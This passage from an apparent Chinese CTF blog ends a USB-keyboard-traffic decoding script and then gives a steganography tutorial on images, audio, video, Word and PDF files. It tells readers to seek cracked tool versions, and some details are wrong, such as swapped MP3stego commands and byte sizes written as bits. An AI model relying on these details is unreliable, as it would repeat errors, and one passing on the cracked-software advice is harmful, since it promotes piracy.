line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240925021555636.png"
                      alt="image-20240925021555636"
                ></p>
<h5 id="全自动工具-1"><a href="#全自动工具-1" class="headerlink" title="全自动工具"></a>全自动工具</h5><p><a class="link"   href="https://github.com/WangYihang/UsbKeyboardDataHacker" >UsbKeyboardDataHacker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 自动抓取键盘流量并转换为字符 （需要kali）</p>
<blockquote>
<p>这里就不演示了，需要的可以自己去试试</p>
</blockquote>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>隐写术</title>
    <url>/2024/09/18/ctf/data/misc/%E9%9A%90%E5%86%99%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h1><p>隐写术即通过一定手段达到信息隐藏的目的，不让除预期的接收者之外的任何人知晓信息的传递事件或信息内容</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例，有需要还原的可以看我的博客的关于这一节的题目</p>
<a href="/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/" title="misc安全WP目录">参考题目目录</a>

<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

<p><a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 16进制编辑器（<a class="link"   href="https://www.puresys.net/2133.html#:~:text=010%20Editor" >新链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</p>
<p><a class="link"   href="https://softmall.net/apps/1498#google_vignette" >TrlDNet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 文件识别工具</p>
<p><a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 数据分离工具</p>
<p><a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> LSB工具（色块工具）（windows）</p>
<p><a class="link"   href="https://github.com/zed-0xff/zsteg" >zsteg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  LSB工具（linux）</p>
<p><a class="link"   href="https://github.com/fire-keeper/BlindWatermark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 盲水印工具</p>
<blockquote>
<p>上面这个是新的，案例提供的是这个<a class="link"   href="https://github.com/chishaxie/BlindWaterMark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 音频隐写工具</p>
<p><a class="link"   href="https://www.petitcolas.net/steganography/mp3stego/" >MP3stego <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> MP3音频隐写工具</p>
<p><a class="link"   href="https://www.watermark-software.com/video-to-picture/video-to-picture.html?ins5.3" >videotopicture <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 视频帧的分离工具</p>
<p><a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> PDF文档隐写工具</p>
<h2 id="文件结构类型及识别"><a href="#文件结构类型及识别" class="headerlink" title="文件结构类型及识别"></a>文件结构类型及识别</h2><h3 id="常见文件头和文件尾"><a href="#常见文件头和文件尾" class="headerlink" title="常见文件头和文件尾"></a>常见文件头和文件尾</h3><table>
<thead>
<tr>
<th align="center">文件扩展名</th>
<th align="center">文件头</th>
<th align="center">文件尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JPEG (jpg)</strong></td>
<td align="center"><strong>FF D8 FF</strong></td>
<td align="center"><strong>FF D9</strong></td>
</tr>
<tr>
<td align="center"><strong>PNG (png)</strong></td>
<td align="center"><strong>89 50 4E 47</strong></td>
<td align="center"><strong>AE 42 60 82</strong></td>
</tr>
<tr>
<td align="center"><strong>GIF (gif)</strong></td>
<td align="center"><strong>47 49 46 38</strong></td>
<td align="center"><strong>00 3B</strong></td>
</tr>
<tr>
<td align="center"><strong>ZIP Archive (zip)</strong></td>
<td align="center"><strong>50 4B 03 04</strong></td>
<td align="center"><strong>50 4B</strong></td>
</tr>
<tr>
<td align="center"><strong>RAR Archive (rar)</strong></td>
<td align="center"><strong>52 61 72 21</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Windows Bitmap (bmp)</td>
<td align="center">42 4D</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">XML (xml)</td>
<td align="center">3C 3F 78 6D 6C</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">HTML (html)</td>
<td align="center">68 74 6D 6C 3E</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">MS Word&#x2F;Excel (xls.or.doc)</td>
<td align="center">D0 CF 11 E0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Adobe Acrobat (pdf)</td>
<td align="center">25 50 44 46 2D 31 2E</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">AVI (avi)</td>
<td align="center">41 56 49 20</td>
<td align="center"></td>
</tr>
</tbody></table>
<blockquote>
<p>在linux中用file命令查看文件类型，windows中用<a class="link"   href="https://softmall.net/apps/1498#google_vignette" >TrlDNET <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具进行查看</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240918234041568.png"
                      alt="image-20240918234041568"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240918234142219.png"
                      alt="image-20240918234142219"
                ></p>
<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h3>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>直接将信息写入图片结束符后面，图片识别程序不会识别后面的代码，所以信息能够被隐藏</p>

    </div>
  </div>

<p>用<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开文件时，直接搜索文本<code>flag,ctf,key</code>等关键词</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919002347396.png"
                      alt="image-20240919002347396"
                ></p>
<h4 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>将图片文件与其他格式文件结合在一起并保存为图片格式，可以通过修改扩展名来得到其中被隐藏的数据</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192235889.png"
                      alt="image-20240919192235889"
                ></p>
<p>使用工具<a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（kali）使图种数据分离</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e atta.png --run-as=root</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919002338362.png"
                      alt="image-20240919002338362"
                ></p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>当该方法可以查看有隐藏文件但无法输出的时候，建议用foremost（kali）</p>

  </div>

<p><strong>使用方法</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-V-显示版权信息并退出</span><br><span class="line">-t-指定文件类型。（-t jpeg，pdf…）</span><br><span class="line">-d-启用间接块检测（对于UNIX文件系统）</span><br><span class="line">-i-指定输入文件（默认为stdin）</span><br><span class="line">-a-写入所有标头，不执行错误检测（损坏的文件）</span><br><span class="line">-w-仅写入审核文件，不将任何检测到的文件写入磁盘</span><br><span class="line">-o-设置输出目录（默认为输出）</span><br><span class="line">-c-设置要使用的配置文件（默认为forest.conf）</span><br><span class="line">-q-启用快速模式。在512字节边界上执行搜索。</span><br><span class="line">-Q-启用静音模式。抑制输出消息。</span><br><span class="line">-v-冗余模式。将所有消息记录到屏幕。</span><br></pre></td></tr></table></figure></div>

<p><strong>常用指令</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">foremost -i 待分离的文件 -o 存放目录</span><br></pre></td></tr></table></figure></div>

<h4 id="EXIF"><a href="#EXIF" class="headerlink" title="EXIF"></a>EXIF</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>直接在图片属性中添加隐藏信息，这种往往容易被忽视</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919002824284.png"
                      alt="image-20240919002824284"
                ></p>
<h3 id="图片宽高"><a href="#图片宽高" class="headerlink" title="图片宽高"></a>图片宽高</h3><p>对于图片，通过<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开可以直接修改宽高，但如果要恢复原始比例就需要用到CRC校验码了，涉及到CRC撞库，需要写脚本来实现，并且当源文件过大，则难以枚举</p>
<table>
<thead>
<tr>
<th>内容</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>89 50 4E 47 0D 0A 1A 0A</td>
<td>png的文件头（固定）</td>
</tr>
<tr>
<td>00 00 00 0D</td>
<td>十进制为13，代表头部数据块的长度为13</td>
</tr>
<tr>
<td>49 48 44 52</td>
<td>ASCII码为IHDR，表明数据块为IHDR</td>
</tr>
<tr>
<td>00 00 02 58</td>
<td>图片高度（4bit）（不固定）</td>
</tr>
<tr>
<td>00 00 02 58</td>
<td>图片宽度（4bit）（不固定）</td>
</tr>
<tr>
<td>08 06 00 00 00</td>
<td>依次为Bit depth、ColorType、 Compression method、 Filter method、Interlace method（共5bit）（不固定）</td>
</tr>
<tr>
<td>BE 66 98 DC</td>
<td>CRC校验码（4bit）（固定）</td>
</tr>
</tbody></table>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919010102979.png"
                      alt="image-20240919010102979"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919005014571.png"
                      alt="image-20240919005014571"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919005242860.png"
                      alt="image-20240919005242860"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919005329960.png"
                      alt="image-20240919005329960"
                ></p>
<p>CRC校验码是由从IDCH到THDR的十七位字节进行计算得到，所以说能够反向破解原始宽高</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919010318218.png"
                      alt="image-20240919010318218"
                ></p>
<p><a class="link"   href="http://www.ip33.com/crc.html" >在线CRC计算网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919010356310.png"
                      alt="image-20240919010356310"
                ></p>
<h3 id="图片色差分析"><a href="#图片色差分析" class="headerlink" title="图片色差分析"></a>图片色差分析</h3><p>使用工具<a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将色块分开查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240928194437081.png"
                      alt="image-20240928194437081"
                ></p>
<p>左右按键都尝试一下就可以得到隐藏的信息了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240928194611681.png"
                      alt="image-20240928194611681"
                ></p>
<h3 id="最低有效位（LSB）"><a href="#最低有效位（LSB）" class="headerlink" title="最低有效位（LSB）"></a>最低有效位（LSB）</h3>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>改变图片的RGB最低位，使其组合成我们想要隐藏的信息，由于变化太小肉眼无法看出，所以能隐写</p>

    </div>
  </div>

<p>提取隐藏信息需要将RGB的最低位提取出来，重新组合成文件或字符串即可</p>
<p>以下是windows系统的<a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> LSB工具示例，可以看到多次尝试就可以拿到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919174523222.png"
                      alt="image-20240919174523222"
                ></p>
<h3 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h3><p>这种隐写方式还原需要两张看起来几乎一样的图片，通过比较图片的MD5值或者图片大小可以发现实际是不同的两张图片</p>
<p>使用工具<a class="link"   href="https://github.com/fire-keeper/BlindWatermark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>上面的工具不是本案例提供的，请下载<a class="link"   href="https://github.com/chishaxie/BlindWaterMark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>

  <div class="note p-4 mb-4 rounded-small red">
    <p>我真的服《CTF实战 从入门到提升》这本书了，已经第几次因为提供的案例和工具对不上和浪费了很多时间，真的是作者就不能把工具给完吗，每次试错都搞得我头大（╬￣皿￣） </p>

  </div>

<p>参考系数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yuantu.png</td>
<td>原来的没有水印的图片</td>
</tr>
<tr>
<td>shuiyintu.png</td>
<td>有水印的图片</td>
</tr>
<tr>
<td>result_1.png</td>
<td>合成的有水印的图片</td>
</tr>
<tr>
<td>result_2.png</td>
<td>提取的水印图片</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python2 bwm.py decode yuantu.png result_1.png result_2.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python3 bwmforpy3.py decode yuantu.png result_1.png result_2.png</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185229567.png"
                      alt="image-20240919185229567"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185257272.png"
                      alt="image-20240919185257272"
                ></p>
<blockquote>
<p>真的服这个作者了(╯‵□′)╯︵ ┴─┴ </p>
</blockquote>
<h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="摩尔斯密码与音频隐写"><a href="#摩尔斯密码与音频隐写" class="headerlink" title="摩尔斯密码与音频隐写"></a>摩尔斯密码与音频隐写</h3><p>在MISC题中打开音频文件若是能听到“滴答”的声音，可以猜测是摩尔斯电码有关</p>

  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>一般不会有这种题，因为没有技术含量还浪费时间</p>

  </div>

<p>使用工具<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>看音频长短，再对照摩斯密码进行还原</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919195226161.png"
                      alt="image-20240919195226161"
                ></p>
<p>提取出来内容为“..-.  .-..  .-  –.  ..  …  .-  ..  .-.  .-.  ..-  -..  -..  .  .-.”</p>
<blockquote>
<p>这里就不还原为英文字母了</p>
</blockquote>
<h3 id="MP3音频"><a href="#MP3音频" class="headerlink" title="MP3音频"></a>MP3音频</h3>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>采用特殊的量化方法，将数据隐藏在MP3文件的奇偶校验块中</p>

    </div>
  </div>

<p>使用工具<a class="link"   href="https://www.petitcolas.net/steganography/mp3stego/" >MP3stego <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行加密解密（貌似只能加密，我没试出来解密的）</p>
<blockquote>
<p>没有密码只能爆破，密码过于复杂则无法破解</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># —E 读取隐藏信息文件的内容，-P 设置密码</span></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">decode.exe -E data.txt yuan.wav new.mp3</span><br><span class="line"><span class="comment"># data.txt是加密文件，yuan.wav是原始音频，new.mp3为输出文件</span></span><br><span class="line"><span class="comment"># 然后会需要输入加密的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">encode.exe -E -P 123456 new.mp3</span><br><span class="line"><span class="comment"># 123456是解密的密码，new.mp3是需要解密的文件</span></span><br></pre></td></tr></table></figure></div>

<h3 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h3>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>使用工具发现波形规律，将波形转化为01字符串，从而进行编码得到加密内容</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920005827975.png"
                      alt="image-20240920005827975"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920010735736.png"
                      alt="image-20240920010735736"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012133437.png"
                      alt="image-20240920012133437"
                ></p>
<p>根据正1负0编写二进制代码，再转化为ascii码即可</p>
<p>这里提供一个脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&#x27;your code&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">7</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">7</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></div>

<h3 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h3><p>音频是一段杂音或者比较刺耳，波形图也没有规律，则可能是频谱图隐写</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012648185.png"
                      alt="image-20240920012648185"
                ></p>
<p>波形图不连续也没有规律，用频谱图看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012732399.png"
                      alt="image-20240920012732399"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920012745555.png"
                      alt="image-20240920012745555"
                ></p>
<p>直接就得到flag了，可以作为一个日常判断来做题，拿到音频题就直接看一下频谱图，只需要用手点点就能发现意想不到的东西，岂不美哉≖‿≖✧ </p>
<h2 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h2><h3 id="视频帧的分离"><a href="#视频帧的分离" class="headerlink" title="视频帧的分离"></a>视频帧的分离</h3>
  <div class="note p-4 mb-4 rounded-small blue">
    <p>一般用于综合题目</p>

  </div>

<p>视频题目里面往往会有些隐藏的东西，但由于可能只存在1-2帧的画面，所以单纯截屏或者肉眼是不行的</p>
<p>借助工具<a class="link"   href="https://www.watermark-software.com/video-to-picture/video-to-picture.html?ins5.3" >videotopicture <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行帧分离</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920015652851.png"
                      alt="image-20240920015652851"
                ></p>
<p>可以看到里面有包含二维码的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta044.jpg"
                      alt="atta044"
                ></p>
<h2 id="文档隐写"><a href="#文档隐写" class="headerlink" title="文档隐写"></a>文档隐写</h2><h3 id="Word文档隐写"><a href="#Word文档隐写" class="headerlink" title="Word文档隐写"></a>Word文档隐写</h3><h4 id="改变字体颜色进行隐藏"><a href="#改变字体颜色进行隐藏" class="headerlink" title="改变字体颜色进行隐藏"></a>改变字体颜色进行隐藏</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>将字体颜色修改为和底色（白色）一样的颜色</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920174326354.png"
                      alt="image-20240920174326354"
                ></p>
<p>字体颜色设置为白色</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920174347322.png"
                      alt="image-20240920174347322"
                ></p>
<h4 id="勾选隐藏文字功能进行隐藏"><a href="#勾选隐藏文字功能进行隐藏" class="headerlink" title="勾选隐藏文字功能进行隐藏"></a>勾选隐藏文字功能进行隐藏</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>勾选隐藏文字功能</p>

    </div>
  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920174442092.png"
                      alt="image-20240920174442092"
                ></p>
<blockquote>
<p>这样隐藏后不会被统计字数，但也不好找到隐藏的位置</p>
<p>tips：可以全选然后取消隐藏</p>
</blockquote>
<h4 id="解压docx文档隐藏文件再压缩进行隐藏"><a href="#解压docx文档隐藏文件再压缩进行隐藏" class="headerlink" title="解压docx文档隐藏文件再压缩进行隐藏"></a>解压docx文档隐藏文件再压缩进行隐藏</h4><p>docx文档修改后缀为.zip或者其他格式的压缩包，解压后就可以看到里面是有文件的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240920180256951.png"
                      alt="image-20240920180256951"
                ></p>
<h3 id="PDF文档隐写"><a href="#PDF文档隐写" class="headerlink" title="PDF文档隐写"></a>PDF文档隐写</h3><p>对PDF文档的隐写需要用到工具<a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>原理</p>

    </div>
    <div class="notel-content">
      <p>会将插入的数据中的每一个ASCII码转换为二进制形式，并将其中的0替换成十六进制的20，1替换弄成十六进制中的09，最终将这些转换后的十六进制数据嵌入PDF中</p>
<p>用16进制打开PDF文件发现里面有很多09或者20的字符，可以猜测是PDF隐写</p>

    </div>
  </div>


  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>使用工具进行隐写和解密，需要知道对应的密码，如果题目中没有得到有关密码的提示，则无法进行解密</p>

  </div>

<blockquote>
<p>使用时可能会报错</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240921010247506.png"
